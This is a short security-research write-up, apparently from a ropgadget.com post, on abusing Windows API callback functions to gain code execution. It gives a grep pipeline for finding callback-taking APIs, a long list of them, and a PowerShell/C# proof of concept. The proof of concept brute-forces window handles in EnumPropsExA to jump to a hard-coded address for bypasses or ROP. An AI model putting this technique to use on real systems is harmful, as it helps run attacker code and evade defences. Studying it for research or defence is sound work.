## Execution Via Callback

### Identification

To identify the Windows callback functions which can get us execution we need to check for callbacks in the Windows API. We can download the Windows API documentation from GitHub and search all of the markdown files for patterns that indicate the presence of a callback in the API. 

```bash
cat \*.h |tr '\\r\\n' ' ' |tr ';' '\\n' |sed -e 's/--//g' -e 's/ / /g' |grep -iE "\_\_in.+(Func|Proc|CallBack| lpfn| lpproc)," |grep -oE " \[a-zA-Z\]+\\(\[a-zA-Z0-9\*\_, \]+\\)" |grep "\_\_in" |cut -d"(" -f1 |sort -u |sed -e 's/^ //g'
```

This gives us a list of API calls that accept an arbitrary address for the callback function. 

```bash
AddClusterNode
BluetoothRegisterForAuthentication
CMTranslateRGBsExt
CallWindowProcA
CallWindowProcW
CreateCluster
CreateDialogIndirectParamA
CreateDialogIndirectParamW
CreateDialogParamA
CreateDialogParamW
CreatePrintAsyncNotifyChannel
CreateTimerQueueTimer
DavRegisterAuthCallback
DbgHelpCreateUserDump
DbgHelpCreateUserDumpW
DdeInitializeA
DdeInitializeW
DestroyCluster
DialogBoxIndirectParamA
DialogBoxIndirectParamW
DialogBoxParamA
DialogBoxParamW
DirectSoundCaptureEnumerateA
DirectSoundCaptureEnumerateW
DirectSoundEnumerateA
DirectSoundEnumerateW
DrawStateA
DrawStateW
EnumCalendarInfoA
EnumCalendarInfoW
EnumChildWindows
EnumDateFormatsA
EnumDateFormatsW
EnumDesktopWindows
EnumDesktopsA
EnumDesktopsW
EnumEnhMetaFile
EnumFontFamiliesA
EnumFontFamiliesExA
EnumFontFamiliesExW
EnumFontFamiliesW
EnumFontsA
EnumFontsW
EnumICMProfilesA
EnumICMProfilesW
EnumLanguageGroupLocalesA
EnumLanguageGroupLocalesW
EnumMetaFile
EnumObjects
EnumPropsExA
EnumPropsExW
EnumPwrSchemes
EnumResourceLanguagesA
EnumResourceLanguagesExA
EnumResourceLanguagesExW
EnumResourceLanguagesW
EnumResourceNamesA
EnumResourceNamesExA
EnumResourceNamesExW
EnumResourceNamesW
EnumResourceTypesA
EnumResourceTypesW
EnumResourceTypesExA
EnumResourceTypesExW
EnumResourceTypesW
EnumSystemCodePagesA
EnumSystemCodePagesW
EnumSystemLanguageGroupsA
EnumSystemLanguageGroupsW
EnumSystemLocalesA
EnumSystemLocalesW
EnumThreadWindows
EnumTimeFormatsA
EnumTimeFormatsW
EnumUILanguagesA
EnumUILanguagesW
EnumWindowStationsA
EnumWindowStationsW
EnumWindows
EnumerateLoadedModules
EnumerateLoadedModulesEx
EnumerateLoadedModulesExW
EventRegister
GetApplicationRecoveryCallback
GrayStringA
GrayStringW
KsCreateFilterFactory
KsMoveIrpsOnCancelableQueue
KsStreamPointerClone
KsStreamPointerScheduleTimeout
LineDDA
MFBeginRegisterWorkQueueWithMMCSS
MFBeginUnregisterWorkQueueWithMMCSS
MFPCreateMediaPlayer
MQReceiveMessage
MQReceiveMessageByLookupId
NotifyIpInterfaceChange
NotifyStableUnicastIpAddressTable
NotifyTeredoPortChange
NotifyUnicastIpAddressChange
PerfStartProvider
PlaExtractCabinet
ReadEncryptedFileRaw
RegisterApplicationRecoveryCallback
RegisterForPrintAsyncNotifications
RegisterServiceCtrlHandlerExA
RegisterServiceCtrlHandlerExW
RegisterWaitForSingleObject
RegisterWaitForSingleObjectEx
SHCreateThread
SHCreateThreadWithHandle
SendMessageCallbackA
SendMessageCallbackW
SetTimerQueueTimer
SetWinEventHook
SetWindowsHookExA
SetWindowsHookExW
SetupDiRegisterDeviceInfo
SymEnumLines
SymEnumLinesW
SymEnumProcesses
SymEnumSourceLines
SymEnumSourceLinesW
SymEnumSymbols
SymEnumSymbolsForAddr
SymEnumSymbolsForAddrW
SymEnumSymbolsW
SymEnumTypes
SymEnumTypesByName
SymEnumTypesByNameW
SymEnumTypesW
SymEnumerateModules
SymEnumerateModules64
SymEnumerateSymbols
SymEnumerateSymbols64
SymEnumerateSymbolsW
SymSearch
SymSearchW
TranslateBitmapBits
WPUQueryBlockingCallback
WdsCliTransferFile
WdsCliTransferImage
WinBioCaptureSampleWithCallback
WinBioEnrollCaptureWithCallback
WinBioIdentifyWithCallback
WinBioLocateSensorWithCallback
WinBioRegisterEventMonitor
WinBioVerifyWithCallback
WlanRegisterNotification
WriteEncryptedFileRaw
WsPullBytes
WsPushBytes
WsReadEnvelopeStart
WsRegisterOperationForCancel
WsWriteEnvelopeStart
mciSetYieldProc
midiInOpen
midiOutOpen
mixerOpen
mmioInstallIOProcA
mmioInstallIOProcW
waveInOpen
waveOutOpen
```


As we can see from the list, there are many API calls to choose from. Any of the listed API calls should work for simple bypasses. However, if we want to do something more fancy like ROP we will need to find API calls that take an argument. 


### PoC
PowerShell C# callback execution proof of concept.

```powershell
function Update-EnumPropsExA{
	$sig = @"

[DllImport("user32.dll", EntryPoint="EnumPropsExA")]
public static extern int EnumPropsExA( uint hwind, uint lpfunc, string lParam);

const int HWIND =  0x20592;
const int LPFUNC = 0x5F15E3B8;
const string LPARAM = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";

public static void UpdateEnumPropsExA(){
	uint i;
	int outval;
	uint tmp = 0x00ffffffff;
	for (i = 0x00000011; i < tmp; i++){
		outval = EnumPropsExA(i, LPFUNC, LPARAM);
		if (outval == 1337){
			break;
			}
		}
}
"@
	Add-Type -MemberDefinition $sig -Name EnumPropsExASPI -Namespace User32
	[User32.EnumPropsExASPI]::UpdateEnumPropsExA()
}


```

In this example, we are bruteforcing the Window Handle argument. Execution will be transferred to the value of LPFUNC afte going through user32.dll EnumPropsExA. 



Source: http://ropgadget.com/posts/abusing_win_functions.html

